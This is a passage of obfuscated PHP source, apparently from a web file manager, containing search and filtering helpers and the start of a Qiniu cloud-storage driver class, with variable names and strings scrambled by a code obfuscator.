$A‚åÖØëÃ¦[$E·ô–‡›ƒ´[168]]; $fËßÏ ¢« = $E·ô–‡›ƒ´[7]; goto ešÎ²ÅÖ»¶; FœÇ‚²‚‡: $E·ô–‡›ƒ´ =& $_SERVER[œº]; $dŠÁâœ‚ç = KodIO::fileTypeList(); $A‚åÖØëÃ¦ = $dŠÁâœ‚ç[$Fóßùéò‹]; goto D¹ù„è¹; cê¤¸×ô§¾: } public function listPathType($F¤ÇÌö‰ó) { $cªŞ‡¢³å± =& $_SERVER[œº]; $F¶é¨ÌÆ‰á = $this->fileTypeWhere($F¤ÇÌö‰ó); if (!$F¶é¨ÌÆ‰á) { return array(); } $f½ÊŞÓæÓã = array($cªŞ‡¢³å±[549] => SourceModel::TYPE_USER, $cªŞ‡¢³å±[550] => USER_ID, $cªŞ‡¢³å±[546] => 0, $cªŞ‡¢³å±[547] => $F¶é¨ÌÆ‰á); return $this->listSource($f½ÊŞÓæÓã); } public function listSearch($C£ÔÄ‹À…, $b£ƒ‹ò¶Œ£ = 300) { goto d±ëÔ¶Ñô; Fæé«’ø¬ƒ: $this->_listSearchTag($cãÛß—Ñ×ß, $C£ÔÄ‹À…, $FÈæÂçÄ´); $this->_listSearchGroupTag($cãÛß—Ñ×ß, $C£ÔÄ‹À…, $FÈæÂçÄ´); $this->_listDataApply($cãÛß—Ñ×ß[$A³ƒñ÷™ Ç[367]]); goto BÜÓ¨ÌœÊ; fÆˆÈÔ²µ: $this->_listSearchBindPinyin($C£ÔÄ‹À…, $bÒ®‚¶Ù·­, $B»ó²ñ«‡ì); $this->alias($A³ƒñ÷™ Ç[516])->_makeOrder(); $bÒ®‚¶Ù·­ = $this->parseWhereLike($bÒ®‚¶Ù·­); goto fß…ª±ì; B÷ğ°¼ì“Ë: if (!isset($bÒ®‚¶Ù·­[$A³ƒñ÷™ Ç[423]])) { $bÒ®‚¶Ù·­[$A³ƒñ÷™ Ç[423]] = 0; } $B»ó²ñ«‡ì = $A³ƒñ÷™ Ç[1934]; $FÈæÂçÄ´ = $B»ó²ñ«‡ì; goto fÆˆÈÔ²µ; BÜÓ¨ÌœÊ: $this->_listMake($cãÛß—Ñ×ß); return $cãÛß—Ñ×ß; goto Cƒ³É©¬ ; d±ëÔ¶Ñô: $A³ƒñ÷™ Ç =& $_SERVER[œº]; if (isset($C£ÔÄ‹À…[$A³ƒñ÷™ Ç[1775]]) && $C£ÔÄ‹À…[$A³ƒñ÷™ Ç[1775]]) { $C£ÔÄ‹À…[$A³ƒñ÷™ Ç[1775]] = str_replace($A³ƒñ÷™ Ç[381], $A³ƒñ÷™ Ç[1933], trim($C£ÔÄ‹À…[$A³ƒñ÷™ Ç[1775]])); } $bÒ®‚¶Ù·­ = $this->_parseSearchWhere($C£ÔÄ‹À…); goto B÷ğ°¼ì“Ë; fß…ª±ì: $cãÛß—Ñ×ß = $this->distinct(!0)->field($B»ó²ñ«‡ì)->where($bÒ®‚¶Ù·­)->selectPage($b£ƒ‹ò¶Œ£); $this->_listSearchFileContent($cãÛß—Ñ×ß, $C£ÔÄ‹À…, $FÈæÂçÄ´); $this->_listSearchDesc($cãÛß—Ñ×ß, $C£ÔÄ‹À…, $FÈæÂçÄ´); goto Fæé«’ø¬ƒ; Cƒ³É©¬ : } private function _listSearchFileContent(&$C ¸ÌÅ¶½¨, $BâÈ §ƒ­, $BóŠäØ‘Ï) { goto DöŞ†…”İõ; dÊí»ä÷…»: $C ¸ÌÅ¶½¨[$B±—¯ ‚[367]] = array_merge($EÚë†Æõ¢, $C ¸ÌÅ¶½¨[$B±—¯ ‚[367]]); $C ¸ÌÅ¶½¨[$B±—¯ ‚[364]][$B±—¯ ‚[365]] += count($EÚë†Æõ¢); goto Cİáñ£ºÌÀ; eê¿ËÔÅÀĞ: if (!isset($AÔÄòã§ïõ[$B±—¯ ‚[28]]) || !is_array($BâÈ §ƒ­[$B±—¯ ‚[447]])) { return; } $AÔÄòã§ïõ[$B±—¯ ‚[447]] = array($B±—¯ ‚[7], $BâÈ §ƒ­[$B±—¯ ‚[447]]); unset($AÔÄòã§ïõ[$B±—¯ ‚[28]]); goto Cë¸Äóê˜Ì; Cë¸Äóê˜Ì: unset($BâÈ §ƒ­[$B±—¯ ‚[447]]); $EÚë†Æõ¢ = $this->field($BóŠäØ‘Ï)->where($AÔÄòã§ïõ)->limit($B±—¯ ‚[1935])->select(); if (!$EÚë†Æõ¢ || count($EÚë†Æõ¢) == 0) { return; } goto dÊí»ä÷…»; DöŞ†…”İõ: $B±—¯ ‚ =& $_SERVER[œº]; if (!$BâÈ §ƒ­[$B±—¯ ‚[1775]] || $C ¸ÌÅ¶½¨[$B±—¯ ‚[364]][$B±—¯ ‚[351]] > 1) { return; } $AÔÄòã§ïõ = $this->_parseSearchWhere($BâÈ §ƒ­); goto eê¿ËÔÅÀĞ; Cİáñ£ºÌÀ: } private function _listSearchTag(&$D¤äââ‘ÂŒ, $cª¯¿ºê¦İ, $a•ˆíÇº´) { goto AÊÊÅßí¡; EŸåÎ·òÔ½: if (!$eñ®ã”â°æ) { return; } $D¥«ÊÜÎºÆ = array($FòÍÍôÀîå[419] => array($FòÍÍôÀîå[7], $eñ®ã”â°æ), $FòÍÍôÀîå[1528] => USER_ID); $aõëéà¼á = Model($FòÍÍôÀîå[420])->field($FòÍÍôÀîå[76])->where($D¥«ÊÜÎºÆ)->select(); goto Cñä•¢‚–; DÉ—Ù·äĞˆ: $eñ®ã”â°æ = array(); $AŠÊÁš´Ëà = $cª¯¿ºê¦İ[$FòÍÍôÀîå[1775]]; foreach ($B¤¬‡ø—î† as $fóÈšì´Œ®) { $B¹’Ò§ = $fóÈšì´Œ®[$FòÍÍôÀîå[28]]; $fÏ½ÌğºÎ  = str_replace($FòÍÍôÀîå[50], $FòÍÍôÀîå[33], Pinyin::encode($B¹’Ò§)); if (stripos($B¹’Ò§, $AŠÊÁš´Ëà) !== !1 || stripos($fÏ½ÌğºÎ , $AŠÊÁš´Ëà) !== !1) { $eñ®ã”â°æ[] = $fóÈšì´Œ®[$FòÍÍôÀîå[393]]; } } goto EŸåÎ·òÔ½; Cñä•¢‚–: $aõëéà¼á = array_to_keyvalue($aõëéà¼á, $FòÍÍôÀîå[33], $FòÍÍôÀîå[76]); $E»¡½áŞ Ú = array_unique($aõëéà¼á); $this->_listSearchMerge($D¤äââ‘ÂŒ, $cª¯¿ºê¦İ, $a•ˆíÇº´, $E»¡½áŞ Ú); goto eÔâ©ö¡‘¤; AÊÊÅßí¡: $FòÍÍôÀîå =& $_SERVER[œº]; if (!$cª¯¿ºê¦İ[$FòÍÍôÀîå[1775]] || $D¤äââ‘ÂŒ[$FòÍÍôÀîå[364]][$FòÍÍôÀîå[351]] > 1) { return; } $B¤¬‡ø—î† = Model($FòÍÍôÀîå[1936])->listData(); goto DÉ—Ù·äĞˆ; eÔâ©ö¡‘¤: } private function _listSearchDesc(&$dèÂğŸÄÒõ, $aöÜ‰­Ñ¬, $aµè‰Ş»¼«) { goto d‡¥ááôª; e›…Å‰Ô•ù: $a§œ‚æéç = array_unique($a§œ‚æéç); if (!$a§œ‚æéç) { return; } $b±¹Ş³ˆÓ¶ = array($FÈÕÊÔò[395] => array($FÈÕÊÔò[7], $a§œ‚æéç), $FÈÕÊÔò[93] => $FÈÕÊÔò[431], $FÈÕÊÔò[372] => array($FÈÕÊÔò[380], $FÈÕÊÔò[1777] . $aöÜ‰­Ñ¬[$FÈÕÊÔò[1775]] . $FÈÕÊÔò[1777])); goto E÷»Ş÷áƒ; d‡¥ááôª: $FÈÕÊÔò =& $_SERVER[œº]; if (!$aöÜ‰­Ñ¬[$FÈÕÊÔò[1775]] || $dèÂğŸÄÒõ[$FÈÕÊÔò[364]][$FÈÕÊÔò[351]] > 1) { return; } $a§œ‚æéç = $this->listSearchChildren($aöÜ‰­Ñ¬[$FÈÕÊÔò[478]]); goto e›…Å‰Ô•ù; E÷»Ş÷áƒ: $F®¾¸½‹¬• = Model($FÈÕÊÔò[532])->field($FÈÕÊÔò[395])->where($b±¹Ş³ˆÓ¶)->select(); $b…–„Ğ¥Ö = array_to_keyvalue($F®¾¸½‹¬•, $FÈÕÊÔò[33], $FÈÕÊÔò[395]); $this->_listSearchMerge($dèÂğŸÄÒõ, $aöÜ‰­Ñ¬, $aµè‰Ş»¼«, $b…–„Ğ¥Ö); goto f•è¶òÓ; f•è¶òÓ: } private function _listSearchGroupTag(&$bäßŒ¥‹Ä®, $a›™½‘÷Åâ, $C™ë‘¯ãèÔ) { goto DŒË‰¾˜é; F‚‡ß©ğƒš: $câµç‡ù = array_to_keyvalue($câµç‡ù, $cÅ÷»ë‰ ß[33], $cÅ÷»ë‰ ß[76]); $BÒ’­öí = array_unique($câµç‡ù); $this->_listSearchMerge($bäßŒ¥‹Ä®, $a›™½‘÷Åâ, $C™ë‘¯ãèÔ, $BÒ’­öí); goto BèÔª¬Ç¡î; D‚¨å„ÃŞë: if (!$F‚‰ïÀàÑ || $F‚‰ïÀàÑ[$cÅ÷»ë‰ ß[404]] != SourceModel::TYPE_GROUP) { return; } $aÛµ„’¹å = $F‚‰ïÀàÑ[$cÅ÷»ë‰ ß[484]]; $d›ÔÖØÖ‚È = Model($cÅ÷»ë‰ ß[1937])->get($aÛµ„’¹å); goto EÌ»ãŠùÊí; a´ŸĞ£‹»Æ: if (!$EªÉáãó„) { return; } $c´Æ–ˆÛßï = array($cÅ÷»ë‰ ß[419] => array($cÅ÷»ë‰ ß[7], $EªÉáãó„), $cÅ÷»ë‰ ß[1528] => 0, $cÅ÷»ë‰ ß[29] => $cÅ÷»ë‰ ß[1799] . $aÛµ„’¹å); $câµç‡ù = Model($cÅ÷»ë‰ ß[420])->field($cÅ÷»ë‰ ß[76])->where($c´Æ–ˆÛßï)->select(); goto F‚‡ß©ğƒš; DŒË‰¾˜é: $cÅ÷»ë‰ ß =& $_SERVER[œº]; if (!$a›™½‘÷Åâ[$cÅ÷»ë‰ ß[1775]] || $bäßŒ¥‹Ä®[$cÅ÷»ë‰ ß[364]][$cÅ÷»ë‰ ß[351]] > 1 || !$a›™½‘÷Åâ[$cÅ÷»ë‰ ß[478]]) { return; } $F‚‰ïÀàÑ = $this->sourceInfo($a›™½‘÷Åâ[$cÅ÷»ë‰ ß[478]]); goto D‚¨å„ÃŞë; EÌ»ãŠùÊí: $EªÉáãó„ = array(); $eØ¹œİÄ·¤ = $a›™½‘÷Åâ[$cÅ÷»ë‰ ß[1775]]; foreach ($d›ÔÖØÖ‚È[$cÅ÷»ë‰ ß[367]] as $B³ò®¹ù¢¨) { $aùáöÕÏÔ¤ = $B³ò®¹ù¢¨[$cÅ÷»ë‰ ß[28]]; $B…½ê“ôß‘ = str_replace($cÅ÷»ë‰ ß[50], $cÅ÷»ë‰ ß[33], Pinyin::encode($aùáöÕÏÔ¤)); if (stripos($aùáöÕÏÔ¤, $eØ¹œİÄ·¤) !== !1 || stripos($B…½ê“ôß‘, $eØ¹œİÄ·¤) !== !1) { $EªÉáãó„[] = $B³ò®¹ù¢¨[$cÅ÷»ë‰ ß[393]]; } } goto a´ŸĞ£‹»Æ; BèÔª¬Ç¡î: } private function _listSearchMerge(&$BÓ³÷ÎÏÆ, $c…Ëáçä‡, $eŠ«à‰Œ, $EÒÂ­öÒ˜İ) { goto CªğÊ÷‰öã; e ÜË«‹„›: $câªå›è² = $this->field($eŠ«à‰Œ)->where($Aù§Â–ƒ)->select(); if (!$câªå›è²) { return; } $cğÉ»–ÏÃ· = array(); goto Bºë­ğ¨”“; Bºë­ğ¨”“: foreach ($câªå›è² as $cÛÓƒ‘“ºÓ) { if ($this->_listSearchFilter($cÛÓƒ‘“ºÓ, $c…Ëáçä‡)) { $cğÉ»–ÏÃ·[] = $cÛÓƒ‘“ºÓ; } } $BÓ³÷ÎÏÆ[$c„‹İÓãì[367]] = array_merge($cğÉ»–ÏÃ·, $BÓ³÷ÎÏÆ[$c„‹İÓãì[367]]); $BÓ³÷ÎÏÆ[$c„‹İÓãì[364]][$c„‹İÓãì[365]] += count($cğÉ»–ÏÃ·); goto aÑ‹Šè”š; AÁÏÑƒ”Óİ: $BÉéÂßˆ = array_diff($EÒÂ­öÒ˜İ, $e«çÄçË¼ê); if (!$BÉéÂßˆ) { return; } $Aù§Â–ƒ = array($c„‹İÓãì[395] => array($c„‹İÓãì[7], $BÉéÂßˆ)); goto e ÜË«‹„›; CªğÊ÷‰öã: $c„‹İÓãì =& $_SERVER[œº]; if (!$EÒÂ­öÒ˜İ) { return; } $e«çÄçË¼ê = array_to_keyvalue($BÓ³÷ÎÏÆ[$c„‹İÓãì[367]], $c„‹İÓãì[33], $c„‹İÓãì[395]); goto AÁÏÑƒ”Óİ; aÑ‹Šè”š: } private function _listSearchFilter($eğÆ¨øîá¯, $c¤ëğ¦³Ô”) { goto fØÜëë·ÖÛ; fØÜëë·ÖÛ: $FÇ–¸è¹ïì =& $_SERVER[œº]; $d±³ĞÃ©¶÷ = $eğÆ¨øîá¯[$FÇ–¸è¹ïì[403]] == $FÇ–¸è¹ïì[87]; if (!strstr($eğÆ¨øîá¯[$FÇ–¸è¹ïì[487]], $FÇ–¸è¹ïì[47] . $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[478]] . $FÇ–¸è¹ïì[47])) { return !1; } goto bê—ÅÚ¶Í‘; bê—ÅÚ¶Í‘: if (isset($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[405]]) && $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[405]] != $FÇ–¸è¹ïì[1742]) { if ($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[405]] == $FÇ–¸è¹ïì[77] && !$d±³ĞÃ©¶÷) { return !1; } if ($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[405]] != $FÇ–¸è¹ïì[77] && $d±³ĞÃ©¶÷) { return !1; } if (!strstr($eğÆ¨øîá¯[$FÇ–¸è¹ïì[168]], $FÇ–¸è¹ïì[47] . $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[405]] . $FÇ–¸è¹ïì[47])) { return !1; } } if (isset($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[1938]]) && $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[1938]] < $eğÆ¨øîá¯[$FÇ–¸è¹ïì[78]]) { return !1; } if (isset($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[1939]]) && $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[1939]] > $eğÆ¨øîá¯[$FÇ–¸è¹ïì[78]]) { return !1; } goto AÅ”­‘ÂçÆ; AÅ”­‘ÂçÆ: if (isset($c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[562]]) && $c¤ëğ¦³Ô”[$FÇ–¸è¹ïì[562]] != $eğÆ¨øîá¯[$FÇ–¸è¹ïì[434]]) { return !1; } return !0; goto b½šÂÀèïæ; b½šÂÀèïæ: } public function listSearchChildren($cœ´¹Ø…î, $CÊ£¼ˆø¼– = 5000) { goto f”›ôÓÊĞœ; f”›ôÓÊĞœ: $f£Ê¿†À§ =& $_SERVER[œº]; $E†ğíóŸî” = array(); $f´­ÅàÂŠ‰ = $this->sourceInfo($cœ´¹Ø…î); goto côô¸§ö; côô¸§ö: $AÎº†Ó¶×İ = array($f£Ê¿†À§[487] => array($f£Ê¿†À§[380], $f´­ÅàÂŠ‰[$f£Ê¿†À§[487]] . $f´­ÅàÂŠ‰[$f£Ê¿†À§[395]] . $f£Ê¿†À§[513])); $aç•Øäô = $this->field($f£Ê¿†À§[395])->cache(null, 600)->where($AÎº†Ó¶×İ)->count(); if ($aç•Øäô > $CÊ£¼ˆø¼–) { return $this->_listSearchChildrenNear($cœ´¹Ø…î, $CÊ£¼ˆø¼–); } goto dÖ¹£¤â”»; dÖ¹£¤â”»: $EŞÎÚˆğ¼ = $this->field($f£Ê¿†À§[395])->where($AÎº†Ó¶×İ)->select(); $E†ğíóŸî” = array_to_keyvalue($EŞÎÚˆğ¼, $f£Ê¿†À§[33], $f£Ê¿†À§[395]); return $E†ğíóŸî”; goto Dñ–‡é›Ä; Dñ–‡é›Ä: } private function _listSearchChildrenNear($EÀ•«Ú’, $C¢£Íê½™ª) { goto DÁÖèİàê; DÌœÚˆø’Œ: $c×£—¬ö¦ = array_merge($c×£—¬ö¦, array_to_keyvalue($E–ÎÆ“éÏ, $cÁÌ¾ß¦Œ¯[33], $cÁÌ¾ß¦Œ¯[395])); $c×£—¬ö¦ = array_slice($c×£—¬ö¦, 0, $C¢£Íê½™ª); return $c×£—¬ö¦; goto C‹…ÏŒÕÏŒ; cã–ÉáŞÔ: if (!$b˜¬‹êÈÆ) { return $c×£—¬ö¦; } $fèƒå¯ª‚£ = array($cÁÌ¾ß¦Œ¯[478] => array($cÁÌ¾ß¦Œ¯[7], $b˜¬‹êÈÆ)); $E–ÎÆ“éÏ = $this->field($cÁÌ¾ß¦Œ¯[1940])->where($fèƒå¯ª‚£)->limit($C¢£Íê½™ª)->select(); goto DÌœÚˆø’Œ; DÁÖèİàê: $cÁÌ¾ß¦Œ¯ =& $_SERVER[œº]; $c×£—¬ö¦ = array(); $fèƒå¯ª‚£ = array($cÁÌ¾ß¦Œ¯[478] => $EÀ•«Ú’); goto fêÖéèˆåÖ; fêÖéèˆåÖ: $E–ÎÆ“éÏ = $this->field($cÁÌ¾ß¦Œ¯[1940])->where($fèƒå¯ª‚£)->select(); $b˜¬‹êÈÆ = array_to_keyvalue(array_filter_by_field($E–ÎÆ“éÏ, $cÁÌ¾ß¦Œ¯[403], $cÁÌ¾ß¦Œ¯[87]), $cÁÌ¾ß¦Œ¯[33], $cÁÌ¾ß¦Œ¯[395]); $c×£—¬ö¦ = array_merge($c×£—¬ö¦, array_to_keyvalue($E–ÎÆ“éÏ, $cÁÌ¾ß¦Œ¯[33], $cÁÌ¾ß¦Œ¯[395])); goto cã–ÉáŞÔ; C‹…ÏŒÕÏŒ: } private function _listSearchBindPinyin($b‡ĞÚÕåí•, &$DÆå¾¶Ê§Í, &$c¿Á÷®Çˆ) { goto D…Ä±ØÕ; B”“®ˆàø: $DÆå¾¶Ê§Í = $B÷«ŞÚ·¨î; goto B¹‡ª¦„Òª; D…Ä±ØÕ: $EÕ”Á›½ù§ =& $_SERVER[œº]; if (!isset($b‡ĞÚÕåí•[$EÕ”Á›½ù§[1775]]) || !$b‡ĞÚÕåí•[$EÕ”Á›½ù§[1775]]) { return; } if (!Input::check($b‡ĞÚÕåí•[$EÕ”Á›½ù§[1775]], $EÕ”Á›½ù§[316]) || strlen($b‡ĞÚÕåí•[$EÕ”Á›½ù§[1775]]) < 2) { return; } goto d¡´†á¯; eâ êÌ±Ã”: $c¿Á÷®Çˆ = $EÕ”Á›½ù§[1942] . str_replace($EÕ”Á›½ù§[47], $EÕ”Á›½ù§[1943], $c¿Á÷®Çˆ); $Dâ¼‡˜Äç® = $DÆå¾¶Ê§Í[$EÕ”Á›½ù§[28]]; unset($DÆå¾¶Ê§Í[$EÕ”Á›½ù§[28]]); goto DÙ‡ƒ›œÔâ; d¡´†á¯: $f·î½ÉŒº‹ = "\x4c\105\106\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\157\137\x73\157\165\x72\143\x65\137\155\145\x74\x61\x20\x6d\x65\x74\x61\40\x6f\x6e\40\x73\157\165\x72\x63\145\56\x73\157\x75\162\143\145\111\x44\40\75\40\x6d\145\x74\x61\x2e\x73\157\x75\162\x63\145\111\x44"; $B÷«ŞÚ·¨î = array(); $c¿Á÷®Çˆ = str_replace(array($EÕ”Á›½ù§[229], $EÕ”Á›½ù§[50], $EÕ”Á›½ù§[1941]), $EÕ”Á›½ù§[33], $c¿Á÷®Çˆ); goto eâ êÌ±Ã”; DÙ‡ƒ›œÔâ: foreach ($DÆå¾¶Ê§Í as $dĞñ–‹ãÚ => $cÛ…ˆ¨–Ô˜) { $B÷«ŞÚ·¨î[$EÕ”Á›½ù§[1942] . $dĞñ–‹ãÚ] = $cÛ…ˆ¨–Ô˜; } foreach ($Dâ¼‡˜Äç® as $Dø¤š„ô»Û) { $B÷«ŞÚ·¨î[] = array($EÕ”Á›½ù§[1944] => $Dø¤š„ô»Û, $EÕ”Á›½ù§[957] => $EÕ”Á›½ù§[1779], array($EÕ”Á›½ù§[1945] => $Dø¤š„ô»Û, $EÕ”Á›½ù§[1946] => array($EÕ”Á›½ù§[7], array($EÕ”Á›½ù§[444], $EÕ”Á›½ù§[443])))); } $this->join($f·î½ÉŒº‹); goto B”“®ˆàø; B¹‡ª¦„Òª: } private function _parseSearchWhere($b¿¥©¤¶”•) { goto eŒêì…ğ–¾; A‹˜¨œ¶”ß: if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[476]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[476]]) { $F©ğŠšëÇ = array($E¹…ì¦Ë³[1948], $b¿¥©¤¶”•[$E¹…ì¦Ë³[476]]); if ($a³‹à³Ø§[$E¹…ì¦Ë³[84]]) { $a³‹à³Ø§[$E¹…ì¦Ë³[84]] = array($a³‹à³Ø§[$E¹…ì¦Ë³[84]], $F©ğŠšëÇ, $E¹…ì¦Ë³[1949]); } else { $a³‹à³Ø§[$E¹…ì¦Ë³[84]] = $F©ğŠšëÇ; } } if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[1938]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[1938]] > 0) { $a³‹à³Ø§[$E¹…ì¦Ë³[78]] = array($E¹…ì¦Ë³[1947], $b¿¥©¤¶”•[$E¹…ì¦Ë³[1938]]); } if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[1939]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[1939]]) { $F©ğŠšëÇ = array($E¹…ì¦Ë³[1948], $b¿¥©¤¶”•[$E¹…ì¦Ë³[1939]]); if ($a³‹à³Ø§[$E¹…ì¦Ë³[78]]) { $a³‹à³Ø§[$E¹…ì¦Ë³[78]] = array($a³‹à³Ø§[$E¹…ì¦Ë³[78]], $F©ğŠšëÇ, $E¹…ì¦Ë³[1949]); } else { $a³‹à³Ø§[$E¹…ì¦Ë³[78]] = $F©ğŠšëÇ; } } goto cŞÏŒƒÙ¯™; cŞÏŒƒÙ¯™: if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[562]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[562]]) { $a³‹à³Ø§[] = array($E¹…ì¦Ë³[434] => $b¿¥©¤¶”•[$E¹…ì¦Ë³[562]], $E¹…ì¦Ë³[432] => $b¿¥©¤¶”•[$E¹…ì¦Ë³[562]], $E¹…ì¦Ë³[957] => $E¹…ì¦Ë³[1779]); } if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[405]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[405]]) { $f„à‡†ÓŠ = $b¿¥©¤¶”•[$E¹…ì¦Ë³[405]]; if ($f„à‡†ÓŠ == $E¹…ì¦Ë³[77]) { $a³‹à³Ø§[$E¹…ì¦Ë³[403]] = 1; } else { if ($f„à‡†ÓŠ == $E¹…ì¦Ë³[1950]) { $a³‹à³Ø§[$E¹…ì¦Ë³[403]] = 0; } else { if ($f„à‡†ÓŠ) { $f„à‡†ÓŠ = is_array($f„à‡†ÓŠ) ? $f„à‡†ÓŠ : explode($E¹…ì¦Ë³[47], $f„à‡†ÓŠ); $a³‹à³Ø§[$E¹…ì¦Ë³[405]] = array($E¹…ì¦Ë³[411], $f„à‡†ÓŠ); $a³‹à³Ø§[$E¹…ì¦Ë³[403]] = 0; } } } } if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[478]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[478]]) { $Cáßœ ŒçÌ = $this->sourceInfo($b¿¥©¤¶”•[$E¹…ì¦Ë³[478]]); $a³‹à³Ø§[$E¹…ì¦Ë³[553]] = array($E¹…ì¦Ë³[512], $Cáßœ ŒçÌ[$E¹…ì¦Ë³[487]] . $b¿¥©¤¶”•[$E¹…ì¦Ë³[478]] . $E¹…ì¦Ë³[513]); } goto B»¡‘‚êŠà; eŒêì…ğ–¾: $E¹…ì¦Ë³ =& $_SERVER[œº]; $a³‹à³Ø§ = array(); if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[721]]) && $b¿¥©¤¶”•[$E¹…ì¦Ë³[721]]) { $a³‹à³Ø§[$E¹…ì¦Ë³[84]] = array($E¹…ì¦Ë³[1947], $b¿¥©¤¶”•[$E¹…ì¦Ë³[721]]); } goto A‹˜¨œ¶”ß; B»¡‘‚êŠà: if (isset($b¿¥©¤¶”•[$E¹…ì¦Ë³[1775]]) && trim($b¿¥©¤¶”•[$E¹…ì¦Ë³[1775]])) { $døÔ“è¾†‡ = trim($b¿¥©¤¶”•[$E¹…ì¦Ë³[1775]]); $Aø£ìÅ‡ò¡ = explode($E¹…ì¦Ë³[50], $døÔ“è¾†‡); if (strlen($døÔ“è¾†‡) > 2 && (substr($døÔ“è¾†‡, 0, 1) == $E¹…ì¦Ë³[116] && substr($døÔ“è¾†‡, -1) == $E¹…ì¦Ë³[116]) || substr($døÔ“è¾†‡, 0, 1) == $E¹…ì¦Ë³[55] && substr($døÔ“è¾†‡, -1) == $E¹…ì¦Ë³[55]) { $døÔ“è¾†‡ = substr($døÔ“è¾†‡, 1, -1); $Aø£ìÅ‡ò¡ = array($døÔ“è¾†‡); } $a³‹à³Ø§[$E¹…ì¦Ë³[28]] = array(array($E¹…ì¦Ë³[512], $E¹…ì¦Ë³[1777] . $døÔ“è¾†‡ . $E¹…ì¦Ë³[1777])); if (count($Aø£ìÅ‡ò¡) > 1) { $a³‹à³Ø§[$E¹…ì¦Ë³[28]] = array(); foreach ($Aø£ìÅ‡ò¡ as $AÛ¶µÛ÷á¥) { if (!trim($AÛ¶µÛ÷á¥)) { continue; } $a³‹à³Ø§[$E¹…ì¦Ë³[28]][] = array($E¹…ì¦Ë³[512], $E¹…ì¦Ë³[1777] . trim($AÛ¶µÛ÷á¥) . $E¹…ì¦Ë³[1777]); } } } return $a³‹à³Ø§; goto aªß¬¢¥ñÍ; aªß¬¢¥ñÍ: } } goto BÆõåï—µ; eíÏÁîæ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($c ÊÖÊ) { parent::__construct(); require_once SDK_DIR . $_SERVER[œº][1302]; $this->_init($c ÊÖÊ); } public function _init($CÓ·Ö®Á—†) { goto FÁšèº÷¤ƒ; fñŸÁ¤“Ï: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto d±øç—íÅˆ; C¤…‹áÆ‡È: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto fñŸÁ¤“Ï; FÁšèº÷¤ƒ: $A¾İ½«ñÏ =& $_SERVER[œº]; foreach ($CÓ·Ö®Á—† as $d›²™†¦šñ => $EÚ“ß²ØÚ¾) { if (isset($this->{$d›²™†¦šñ})) { $this->{$d›²™†¦šñ} = $EÚ“ß²ØÚ¾; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($A¾İ½«ñÏ[1303] . LNG($A¾İ½«ñÏ[1262])); } goto C¤…‹áÆ‡È; d±øç—íÅˆ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($E‚¢±šÕ„´, $C˜•¯ÉÙ¸è = '', $E©ø¹Á•–µ = REPEAT_RENAME) { if ($this->setContent($E‚¢±šÕ„´, $C˜•¯ÉÙ¸è)) { return $this->getPathOuter($E‚¢±šÕ„´); } return !1; } public function mkdir($c£ÛõÇÑç, $e˜ŸìØÓŠù = REPEAT_SKIP) { goto bœ³é±ö™÷; bœ³é±ö™÷: $Bù¾“ÃÙÉÌ =& $_SERVER[œº]; $aÑ£ùÈöª = trim($c£ÛõÇÑç, $Bù¾“ÃÙÉÌ[8]); if ($this->_isFolder($aÑ£ùÈöª)) { return $this->getPathOuter($aÑ£ùÈöª); } goto C›Ãì§£Ãé; C›Ãì§£Ãé: $c£ÛõÇÑç = $aÑ£ùÈöª . $Bù¾“ÃÙÉÌ[8]; $Fàİ¬‰ÀŒÖ = get_path_this($aÑ£ùÈöª); $B„Ê÷Ñ”™ = $c£ÛõÇÑç . $Fàİ¬‰ÀŒÖ; goto BÁÒñËÕ‹¢; BÁÒñËÕ‹¢: if (!$this->mkfile($B„Ê÷Ñ”™)) { return !1; } if (!$this->moveFile($B„Ê÷Ñ”™, $c£ÛõÇÑç)) { $this->delFile($B„Ê÷Ñ”™); return !1; } return $this->getPathOuter($aÑ£ùÈöª); goto A®ƒ¯»ã‡; A®ƒ¯»ã‡: } public function copyFile($Fš…—ñ™ˆ, $cÕÊô“‰ì) { $D­ßõˆÀ = $this->bucketManager->copy($this->bucket, $Fš…—ñ™ˆ, $this->bucket, $cÕÊô“‰ì, !0); return $D­ßõˆÀ ? !1 : $this->getPathOuter($cÕÊô“‰ì); } public function moveFile($cŠ²‰ÛÉ·ç, $eÂÄî³«Ô) { $DÙ‹”ÜÅª© = $this->bucketManager->move($this->bucket, $cŠ²‰ÛÉ·ç, $this->bucket, $eÂÄî³«Ô, !0); return $DÙ‹”ÜÅª© ? !1 : $this->getPathOuter($eÂÄî³«Ô); } public function delFile($D¡´™ó…ŸË) { if (!$this->exist($D¡´™ó…ŸË)) { return !0; } $CÅÌ¢ø¸” = $this->bucketManager->delete($this->bucket, 